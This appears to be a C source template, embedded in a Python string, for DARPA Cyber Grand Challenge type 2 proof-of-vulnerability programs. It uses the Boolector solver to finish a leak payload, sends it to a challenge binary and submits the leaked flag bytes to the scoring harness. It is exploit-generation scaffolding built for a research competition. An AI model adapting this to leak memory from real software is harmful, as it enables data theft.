c_template = """
#include <libcgc.h>
#include <stdlib.h>
#include <boolector.h>
#include <string.h>

/* global output data */
BoolectorNode *output_val = NULL;
size_t output_size = 0;
size_t recv_off = 0;
int num_symbols = 0;

// usual globals
char *received_data = NULL;
char *payload = NULL;
size_t payload_buffer_len;
size_t recv_buf_len;
const size_t payload_len = {payload_len};


// INTEGER STUFF
// the integers must be ordered by start loc
size_t payload_int_start_locs[] = {payload_int_start_locations};
int payload_int_bases[] = {payload_int_bases};
int payload_int_expected_lens[] = {payload_int_expected_lens};
// +1 to silence the warning if it's 0
int payload_int_corrections[{num_payload_ints}+1] = {0};
size_t recv_int_start_locs[] = {recv_int_start_locations};
int recv_int_expected_lens[] = {recv_int_expected_lens};
int recv_int_corrections[{num_payload_ints}+1] = {0};
int recv_int_bases[] = {recv_int_bases};


enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};

void die(const char *str) {
    transmit(2, str, strlen(str), NULL);
    _terminate(1);
}

void debug_str(const char *str) {
    transmit(2, str, strlen(str), NULL);
}

/*
 * Test file descriptor readiness.
 */

int fd_ready(int fd) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

void debug_print(const char *msg) {
  size_t len = (size_t)strlen(msg);
  transmit(2, msg, len, 0);
}

int fd_ready_timeout(int fd, int timeout_us) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = timeout_us/1000000;
  tv.tv_usec = timeout_us % 1000000;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}


void safe_memcpy(char *dst, char *src, int len) {
  char *foo = malloc(len);
  memcpy(foo, src, len);
  memcpy(dst, foo, len);
  free(foo);
}

void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
  void* pNew = realloc(pBuffer, newSize);
  if ( newSize > oldSize && pNew ) {
    size_t diff = newSize - oldSize;
    void* pStart = ((char*)pNew) + oldSize;
    memset(pStart, 0, diff);
  }
  return pNew;
}

int get_int_len(char *start, int base, int max) {
  char buf[0x20] = {0};
  memcpy(buf, start, max);
  char *endptr = 0;
  strtoul(buf, &endptr, base);
  if (endptr - buf > max) {
    return max;
  }
  return endptr - buf;
}

char *strrev (char *str)
{
  int i;
  int len = 0;
  char c;
  if (!str)
    return NULL;
  while(str[len] != '\\0'){
    len++;
  }
  for(i = 0; i < (len/2); i++)
  {
    c = str[i];
    str [i] = str[len - i - 1];
    str[len - i - 1] = c;
  }
  return str;
}

int itoa_len(int num, unsigned char* str, int len, int base)
{
  int negative = 0;
  if (num < 0) {
    negative = 1;
    num = -num;
    len -= 1;
  }

  int sum = num;
  int i = 0;
  int digit;

  if (len == 0)
    return -1;
  do
  {
    digit = sum % base;
    if (digit < 0xA)
      str[i++] = '0' + digit;
    else
      str[i++] = 'A' + digit - 0xA;
    sum /= base;
  } while (sum && (i < (len - 1)));
  if (i == (len - 1) && sum)
    return -1;

  if (negative) {
    str[i] = '-';
    i++;
  }

  str[i] = '\\0';
  strrev((char*)str);
  return 0;
}

size_t receive_n_timeout( int fd, void *dst_buf, size_t n_bytes, int timeout_us )
{
  char *dst = dst_buf;
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (!fd_ready_timeout(fd, timeout_us)) {
      return len;
    }

    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    if (rx == 0) {
      return len;
    }
    len += rx;
  }

  return len;
}

/*
 * Receive n_bytes into no particular buffer.
 */
size_t blank_receive( int fd, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  char junk_byte;

  while (len < n_bytes) {
    if (!fd_ready(fd)) {
        return len;
    }
    if (receive(fd, &junk_byte, 1, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

char to_char(char *str) {
  int i;
  char r = '\\0';

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<8;i++)
    r |= ((str[7-i] - '0') & 1) << i;

  return r;
}

unsigned int to_int(char *str) {
  int i;
  int r = 0;

  if (strlen(str) != 32)
    die("bv_assignment returned a string not of length 32\\n");

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<32;i++)
    r |= ((str[31-i] - '0') & 1) << i;

  return r;
}

void to_bits(char *dst, char c) {
    int i;
    for(i=0;i<8;i++) {
        dst[i] = '0' + ((c & (1 << (7-i))) >> (7-i));
    }
}

// function to get the real offsets
size_t real_payload_off(size_t payload_off) {
  size_t out_off = payload_off;
  for (int i = 0; i < {num_payload_ints}; i++) {
    if (payload_off > payload_int_start_locs[i]+1) {
      out_off += payload_int_corrections[i];
    }
  }
  return out_off;
}

size_t real_recv_off(size_t recv_start) {
  size_t out_off = recv_start;
  for (int i = 0; i < {num_recv_ints}; i++) {
    if (recv_start > recv_int_start_locs[i]+1) {
      out_off += recv_int_corrections[i];
    }
  }
  return out_off;
}

size_t check_for_recv_extra(size_t recv_start, size_t num_bytes) {
  size_t num_extra = 0;
  for (int i = 0; i < {num_recv_ints}; i++) {
    if (recv_start <= recv_int_start_locs[i] && recv_start+num_bytes > recv_int_start_locs[i]) {
      num_extra += 8;
    }
  }
  return num_extra;
}

size_t fixup_recv_amount(size_t recv_start, size_t recv_amount) {
  // we want the recv amount to be what it would be if all integer lengths were the same
  size_t fixed_recv_amount = recv_amount;
  for (int i = 0; i < {num_recv_ints}; i++) {
    if (recv_start <= recv_int_start_locs[i] && recv_start+recv_amount > recv_int_start_locs[i]) {
      // we read in an integer, get the length of the integer we read
      int len = get_int_len(received_data+real_recv_off(recv_int_start_locs[i]), recv_int_bases[i], recv_amount-(recv_int_start_locs[i]-recv_start));
      // store the difference between it and the expected length
      recv_int_corrections[i] = len-recv_int_expected_lens[i];
      // fix recv amount
      fixed_recv_amount -= recv_int_corrections[i];
    }
  }
  return fixed_recv_amount;
}

void set_payload_int_solve_result(Btor *btor, int bid, int base, int int_info_num) {
  char temp_int_buf[0x20] = {0};
  // get the solve result
  BoolectorNode *int_val = boolector_match_node_by_id(btor, bid);
  int temp_int = to_int(boolector_bv_assignment(btor, int_val));

  // convert to ascii
  itoa_len(temp_int, (unsigned char*)temp_int_buf, sizeof(temp_int_buf), base);
  // get the length, and the expected length
  int int_len = strlen(temp_int_buf);
  int expected_len = payload_int_expected_lens[int_info_num];
  int correction = int_len - expected_len;

  // now we move stuff if needed
  int real_int_start = real_payload_off(payload_int_start_locs[int_info_num]);
  // only move stuff if the correction wasn't set
  if (payload_int_corrections[int_info_num] != correction) {
    int dest_off = real_int_start + int_len;
    int current_off = real_int_start + expected_len + payload_int_corrections[int_info_num];
    // realloc if needed
    if (current_off > dest_off) {
      size_t old_payload_buffer_len = payload_buffer_len;
      payload_buffer_len += current_off - dest_off;
      payload = realloc_zero(payload, old_payload_buffer_len, payload_buffer_len);
    }
    safe_memcpy(payload + dest_off, payload + current_off, real_payload_off(payload_len)-current_off);
    payload_int_corrections[int_info_num] = correction;
  }
  memcpy(payload + real_int_start, temp_int_buf, int_len);

}

// end of fixup codes

void make_new_symbol(char symbol_name[0x40]) {
  num_symbols++;
  memset(symbol_name, 0, 0x40);
  sprintf(symbol_name, "sym_%d", num_symbols);
}

void append_byte_to_output(Btor *btor, size_t byte_idx) {
    BoolectorNode *new_byte;
    // if the byte has been read in we use a concrete bv
    if (byte_idx < recv_off) {
      new_byte = boolector_unsigned_int(btor, received_data[real_recv_off(byte_idx)], 8);
    }
    else {
      // if the byte has not been read in yet, we use a new symbolic value
      char symbol_name[0x40];
      make_new_symbol(symbol_name);
      new_byte = boolector_var(btor, 8, symbol_name);
    }

    /* update output */
    if (output_val == NULL) {
      output_val = new_byte;
    }
    else {
      output_val = boolector_concat(btor, output_val, new_byte);
    }
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Negotiate a type 2 pov.
 * Returns 0 on success. On success, the t2vals structure holds the address
 * (t2vals->region_addr) and size of a memory region (t2vals->region_size)
 * from which the POV must leak a specific number of bytes (t2vals->read_size).
 */
int type2_negotiate(type2_vals *t2vals) {
   uint32_t povType = 2;
   if (send_all(3, &povType, sizeof(povType))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t2vals, sizeof(type2_vals)) != sizeof(type2_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Submit the len bytes in the val buffer as the results of a type 2 POV
 * Returns 0 on success
 */
int type2_submit(const unsigned char *val, size_t len) {
   return send_all(3, val, len);
}

void constrain_output_var(Btor *btor, int output_var_idx) {
  output_val = NULL;
  {byte_getting_code}

  BoolectorNode *output_val_var = boolector_match_node_by_id(btor, output_var_idx);
  BoolectorNode *con = boolector_eq(btor, output_val_var, output_val);
  boolector_assert(btor, con);
}


int do_pov() {
  type2_vals t2vals;
  if (type2_negotiate(&t2vals) != 0) {
    die("type 2 negotiate failure\\n");
  }

  char *error;
  int status;

  const char orig_payload[] = "{raw_payload}";
  payload_buffer_len = payload_len;
  payload = malloc(payload_len);
  memcpy(payload, orig_payload, payload_len);
  recv_buf_len = {recv_buf_len};
  received_data = calloc(recv_buf_len, 1);

  BoolectorNode *cur_byte;

  // current position in the payload
  size_t payload_off = 0;

  // *** integer stuff ***
  // a buffer for copying integers to and checking them
  char temp_int_buf[0x20];
  unsigned long temp_int;
  BoolectorNode *int_val;
  BoolectorNode *int_val_var;
  BoolectorNode *int_con;
  int recv_extra_for_int = 0;
  size_t fake_recv_amount = 0;
  size_t send_amount = 0;
  size_t recv_amount = 0;
  size_t old_recv_buf_len = 0;
  // *** end integer stuff ***

  // BoolectorNodes for use in challenge response
  BoolectorNode *stdout_val_var;
  BoolectorNode *stdout_val;
  BoolectorNode *stdout_con;
  BoolectorNode *payload_val;
  BoolectorNode *payload_val_var;
  BoolectorNode *payload_con;

  {solver_code}

  if (payload_off < payload_len) {
    send_all(1, payload+real_payload_off(payload_off), real_payload_off(payload_len)-real_payload_off(payload_off));
  }
  recv_off += receive_n_timeout(0, received_data+real_recv_off(recv_off), real_recv_off({recv_buf_len}) - real_recv_off(recv_off), 500000);

  BoolectorNode *cgc_flag_var = boolector_match_node_by_id({btor_name}, {cgc_flag_data_idx});

  char *flag_data = boolector_bv_assignment({btor_name}, cgc_flag_var);
  char flag[4];

  flag[0] = to_char(flag_data + {flag_byte_1} * 8);
  flag[1] = to_char(flag_data + {flag_byte_2} * 8);
  flag[2] = to_char(flag_data + {flag_byte_3} * 8);
  flag[3] = to_char(flag_data + {flag_byte_4} * 8);

  type2_submit((unsigned char *)flag, t2vals.read_size);

  return 0;
}

int main(void) {
    /* align the stack so that boolector can work in all circumstances */
    asm(\"and $0xfffffff0, %esp\\n\");

    /* terminate, stack hasn't been fixed up */
    _terminate(do_pov());
}

"""
